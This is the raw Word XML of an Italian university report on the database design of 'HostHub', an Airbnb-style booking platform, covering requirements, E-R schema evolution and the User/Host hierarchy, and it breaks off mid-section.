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6888" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F4E79"/>
          <w:sz w:val="40"/>
        </w:rPr>
        <w:t>Progetto di Basi di Dati</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D230472" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F4E79"/>
          <w:sz w:val="56"/>
        </w:rPr>
        <w:t>HostHub</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="036E577E" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Documentazione della progettazione della base di dati</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B1F3A97" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00597ADF"/>
    <w:p w14:paraId="38178713" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000" w:rsidP="00C85B24">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>HostHub è una piattaforma ispirata ad Airbnb, progettata per gestire alloggi, esperienze turistiche, prenotazioni, recensioni e dati di supporto come servizi, badge, città, lingue e punti di interesse. La relazione descrive principalmente la progettazione della base di dati: dalla raccolta delle specifiche, all’evoluzione del modello E-R, fino alla traduzione nel modello relazionale e all’integrazione con Django.</w:t>
      </w:r>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A5C408" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>1. Raccolta delle specifiche della realtà d’interesse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675E68D4" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>HostHub</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nasce</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> come </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>progetto</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> universitario per il corso di Basi di Dati. La realtà di interesse è quella di una piattaforma online per la prenotazione di alloggi ed esperienze. Il sistema deve permettere agli utenti di registrarsi, consultare offerte disponibili, effettuare prenotazioni e lasciare recensioni. Allo stesso tempo deve consentire agli host di gestire i propri alloggi e alle agenzie di proporre esperienze turistiche.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BE88C05" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Il progetto è stato pensato ponendo al centro la base di dati. L’obiettivo non è soltanto realizzare una semplice applicazione web funzionante, ma progettare uno schema coerente, normalizzato e adatto a supportare le funzionalità richieste. Per questo motivo la documentazione dà maggiore importanza alle entità, alle relazioni, alle chiavi, alle viste e alle scelte di traduzione nel modello relazionale.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13507116" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Dal punto di vista funzionale, il sistema deve gestire:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="100F2798" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">utenti registrati, con dati </w:t>
      </w:r>
      <w:r w:rsidRPr="00DD58A7">
        <w:t>anagrafici</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> e credenziali di accesso;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="306EBA73" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>host, cioè utenti che pubblicano e gestiscono alloggi;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F3AB84" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>alloggi, con informazioni su posizione, prezzo, capienza e caratteristiche;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7907A358" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>agenzie, responsabili della proposta di esperienze turistiche;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3512503E" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>esperienze, cioè attività prenotabili dagli utenti;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A9D3C4F" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>prenotazioni di alloggi e prenotazioni di esperienze;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D1F57C0" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>recensioni riferite alle prenotazioni effettuate;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56762B4D" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">servizi offerti dagli alloggi, badge degli host, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>città</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>punti</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> di interesse;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E681EEA" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>viste SQL per semplificare interrogazioni frequenti e schermate applicative.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B76A6BD" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">Nel PDF dello schema del database risultano presenti le tabelle principali del dominio, tra cui </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>utente</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, host, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>alloggio</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>agenzia</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>esperienze</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>prenotazione_alloggio</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>prenotazione_esperienze</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>recensione_alloggio</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>recensione_esperienze</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>servizio</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, badge, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>citta</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>punti_interesse</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">. Sono </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>presenti</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>anche</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>tabelle</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> associative come </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>offre</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ottiene</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>oltre</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> a diverse viste SQL dedicate a classifiche, dashboard, profili completi e statistiche.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21E76F30" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Requisiti del sito web</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A145B3" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>L’applicazione web realizzata con Django ha lo scopo di dimostrare il funzionamento della base di dati. Le funzionalità applicative non sono l’aspetto principale del progetto, ma servono a verificare che lo schema relazionale sia effettivamente utilizzabile in un contesto concreto.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33FBC5E2" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>I requisiti principali del sito possono essere riassunti nei seguenti punti:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE3517B" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>visualizzazione di una home page con destinazioni e alloggi in evidenza;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B9C87B" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>registrazione, login e logout degli utenti;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D4CE6A2" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>consultazione della lista degli alloggi e filtro per caratteristiche principali;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A38A76D" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>visualizzazione del dettaglio di un alloggio e prenotazione di un soggiorno;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A7BBA85" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>consultazione della lista delle esperienze e filtro per categoria, prezzo o luogo;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47AF4374" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>visualizzazione del dettaglio di un’esperienza e relativa prenotazione;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29BB8964" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>profilo utente con riepilogo delle prenotazioni effettuate;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A928969" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>inserimento di recensioni dopo la conclusione del soggiorno o dell’esperienza;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02AE50F2" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>dashboard host per visualizzare alloggi gestiti, prenotazioni e guadagni;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7464188C" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>modifica di alcuni dati degli alloggi da parte dell’host proprietario.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0E9B63" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Nel repository sono presenti le rotte per home, alloggi, esperienze, registrazione, login, logout, dettaglio alloggio, dettaglio esperienza, profilo utente, dashboard host e modifica alloggio. Non è stata verificata, nelle rotte principali analizzate, una pagina specifica per la dashboard agenzia, anche se nel database è presente la vista vista_dashboard_guadagni_agenzia.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E6BFE5B" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>3. Progettazione concettuale della base di dati</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0009B74A" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>La progettazione concettuale è stata sviluppata attraverso tre versioni successive del diagramma E-R. Questa evoluzione ha permesso di individuare progressivamente le entità principali, correggere alcune criticità e arrivare a uno schema finale più vicino alla struttura relazionale implementata.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC93746" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 Primo schema E-R</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="355A4469" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Il primo schema E-R rappresenta una versione iniziale e più grezza della progettazione. In questa fase erano già presenti molte aree fondamentali del dominio: utenti, alloggi, esperienze, agenzie, prenotazioni, recensioni, servizi, città, lingue e badge. Tuttavia, alcune relazioni risultavano ancora poco chiare o troppo generiche.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62FF3851" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>In particolare, la gestione delle prenotazioni e delle recensioni non risultava ancora completamente separata tra alloggi ed esperienze. Anche la distinzione tra utente, guest e host era presente, ma non ancora perfettamente collegata al futuro schema relazionale. Alcune relazioni avevano nomi meno immediati e alcune cardinalità potevano essere migliorate.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="742070B0" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Questa prima fase è stata comunque utile perché ha permesso di individuare le principali aree del sistema e di comprendere quali oggetti dovessero diventare entità autonome nel database.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8FF40B" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="754765F8" wp14:editId="4F1FC125">
            <wp:extent cx="5852160" cy="5517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 E-R 1.jpg"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5852160" cy="5517832"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C92173E" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Figura 1 - Primo schema E-R iniziale.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B92B025" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 Secondo schema E-R</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="157C306B" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Il secondo schema E-R mostra una struttura più ordinata. La separazione tra prenotazione alloggio e prenotazione esperienza diventa più evidente, così come la distinzione tra recensioni degli alloggi e recensioni delle esperienze. Questa scelta migliora la coerenza del modello, perché le due tipologie di prenotazione hanno attributi diversi.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585A3C75" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Anche entità di supporto come Badge, Servizio, Citta e Punti di interesse trovano una collocazione più chiara. Le relazioni tra host, alloggi, agenzie ed esperienze diventano più leggibili e il modello si avvicina maggiormente allo schema relazionale finale.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18CE2834" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Restavano però alcune criticità residue: alcune relazioni potevano essere ancora semplificate, la generalizzazione dell’utente non era del tutto stabile e alcuni nomi di entità o associazioni richiedevano maggiore coerenza rispetto alle tabelle che sarebbero state implementate.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37E9023F" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="10419192" wp14:editId="3E7A3B72">
            <wp:extent cx="5852160" cy="5963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 E-R 2.drawio.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5852160" cy="5963669"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0107FCF0" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Figura 2 - Secondo schema E-R intermedio.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A7F32B2" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 Schema E-R finale</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CC89048" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Il terzo schema E-R rappresenta la versione finale scelta per il progetto. È stato preferito perché risulta più coerente con lo schema relazionale implementato e perché distingue con maggiore chiarezza le aree principali del dominio.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="655419A5" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Lo schema finale separa chiaramente alloggi ed esperienze, prenotazioni di alloggi e prenotazioni di esperienze, recensioni di alloggi e recensioni di esperienze. Inoltre rappresenta meglio la specializzazione dell’utente in guest e host, rendendo più semplice la successiva traduzione in tabelle SQL e modelli Django.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6668BE5C" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>La versione finale privilegia quindi leggibilità, coerenza e facilità di implementazione. Questa scelta è particolarmente adatta a un progetto universitario, perché consente di mostrare in modo ordinato il passaggio dal modello concettuale al modello relazionale.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5BAD15" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="72476119" wp14:editId="3764F05F">
            <wp:extent cx="5852160" cy="6006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etto Schema E-R Finale.jpg"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5852160" cy="6006494"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="670BDA6A" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="595959"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Figura 3 - Schema E-R finale.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC701E7" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Ristrutturazione della gerarchia Utente</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09A0DC41" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Nel modello concettuale è presente una gerarchia tra Utente, Guest e Host. L’idea alla base della generalizzazione è che ogni soggetto registrato possieda dati comuni, ma possa assumere ruoli diversi all’interno della piattaforma.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B2E5B36" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>La generalizzazione può essere interpretata come totale e sovrapposta. È totale perché ogni utente deve assumere almeno un ruolo operativo: può utilizzare la piattaforma come guest, come host oppure come entrambi. È sovrapposta perché i ruoli non sono esclusivi: una persona può pubblicare un proprio alloggio e allo stesso tempo prenotare alloggi o esperienze offerte da altri.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C6E3043" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Strategia adottata: mantenimento del padre Utente e tabella specifica Host</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A3E47BD" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Nel modello relazionale è stata mantenuta la tabella Utente per conservare i dati comuni: nome, cognome, email, password hash, telefono e data di registrazione. La tabella Host contiene invece solo gli attributi specifici del ruolo host, cioè descrizione_profilo e data_attivazione.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72530FD9" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
        <w:t>La chiave di Host coincide con la chiave dell’utente specializzato: host.id_host è collegato a utente.id_utente. In questo modo l’host non è un soggetto indipendente, ma un utente dotato di funzionalità aggiuntive.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7793F123" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t>Vantaggi della scelta</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0196CEEB" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>evita la duplicazione dei dati anagrafici comuni;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="118CC2F3" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>mantiene ordinata la separazione tra dati generali e dati specifici dell’host;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="601F92E2" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>permette a uno stesso utente di comportarsi sia da ospite sia da host;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3652CCB2" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>rispecchia il funzionamento di una piattaforma reale, dove i ruoli degli utenti non sono necessariamente esclusivi;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="218389B4" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Puntoelenco"/>
      </w:pPr>
      <w:r>
        <w:t>rende semplice controllare, a livello applicativo, se un utente possiede anche il ruolo host.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E468B57" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
      <w:r>
        <w:t>Osservazione sul ruolo Guest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="035C775A" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
      <w:r>
